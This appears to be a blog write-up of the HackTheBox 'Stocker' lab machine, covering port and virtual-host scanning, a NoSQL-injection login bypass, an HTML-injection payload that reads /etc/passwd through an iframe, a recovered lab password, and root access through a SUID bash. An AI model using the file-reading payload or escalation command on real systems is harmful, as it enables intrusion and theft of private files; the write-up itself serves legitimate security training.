# :game_die: Stocker Htb Easy 2A9E2551378B

---

Hi! My name is Hashar Mujahid. And this is the write-up of the stocker, an easy-level machine from HackTheBox. I hope you will enjoy it.

*Banner*

### PORT SCAN:

Let’s start with a port scan.

```
hax-13@ZARB:~/Documents/ctfs/htb/easy$ sudo nmap -sC -sV -p- --min-rate 1500 10.
10.11.196 -oN nmap/tcp-port-all.txt
[sudo] password for hax-13:
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-29 13:24 PKT
Nmap scan report for 10.10.11.196
Host is up (0.59s latency).
Not shown: 65533 closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0
)
80/tcp open http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap
.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.03 seconds
```

We have a webserver running on port 80.

### WEBSITE:

Let’s add the domain to our /etc/hosts file and visit the website

*Tech profile*Directory Scan:

```
________________________________________________

:: Method : GET
:: URL : http://stocker.htb/FUZZ
:: Wordlist : FUZZ: /opt/wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200,204,301,302,307,401,403
________________________________________________

img [Status: 301, Size: 178, Words: 6, Lines: 8]
css [Status: 301, Size: 178, Words: 6, Lines: 8]
js [Status: 301, Size: 178, Words: 6, Lines: 8]
fonts [Status: 301, Size: 178, Words: 6, Lines: 8]
[Status: 200, Size: 15463, Words: 4199, Lines: 322]
```

Nothing Interesting.

Let’s do a VHOST SCAN.

### VIRTUAL HOSTS:

```
________________________________________________

:: Method : GET
:: URL : http://stocker.htb/
:: Wordlist : FUZZ: /opt/wordlist/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
:: Header : Host: FUZZ.stocker.htb
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200,204,301,302,307,401,403
:: Filter : Response size: 178
________________________________________________

dev [Status: 302, Size: 28, Words: 4, Lines: 1]
:: Progress: [114441/114441] :: Job [1/1] :: 182 req/sec :: Duration: [0:10:26] :: Errors: 0 ::
```

We have a new subdomain named dev.stocker.htb so let’s add this to our host's file as well.

### SUBDOMAIN:

*Login pannel*

Found a login pannel.

Login Bypass:

## Get Hashar Mujahid’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

After trying SQL injection techniques to bypass the login panel I tried no SQL injection attacks from hack tricks.

This payload works but you will also have to change the content type to `application/json` .

*Bypassed*

So now let’s log in.

*landing page*

*node js*

It looks like an e-commerce store. Let’s order some stuff and analyze the traffic.

### XSS → SSRF → LFI:

When we place an order and click on submit we can see a request is made to the `api/order`the title field in the body is vulnerable to XSS attack but we can also trigger ssrf with xss. Found this payload to retrieve files from the system using xss img tag and iframe.

```

{"basket":[{"_id":"","title":"<img src='echopwn' onerror=\"document.write('<iframe height=800 width=500 src=file:///etc/passwd></iframe>')\"/>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":1, "amount":1}]}
```

using this json body and making a request, I could retrieve the contents of /etc/passwd.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System
(admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network
Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd
Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time
Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
landscape:x:109:116::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core
Dumper:/:/usr/sbin/nologin
fwupd-refresh:x:112:119:fwupd-refresh
user,,,:/run/systemd:/usr/sbin/nologin
mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

we can see user angoose has access to /bin/bash. We could try to retrieve the id_rsa from the home directory. But falied.

Let’s try to read the credentials from the website as it uses MongoDB it surely will have credentials in the files.

we could try to retrieve the index.js from the dev.stocker.htb domain. The path of the file will be. `/var/www/dev/index.js` .

We can see the credentials of the database. we could try to login angoose with these creds.

### FOOTHOLD :

```
angoose:IHeardPassphrasesArePrettySecure
```

Let’s try to log in.

### PRIVILEGE ESCALATION:

After running linpeas.sh we can see the /bin/bash has suid set.

We can get root privileges just by running commands.

`/usr/bin/bash -p`

That was easy.

Hope you enjoyed this blog. follow me for more.

---
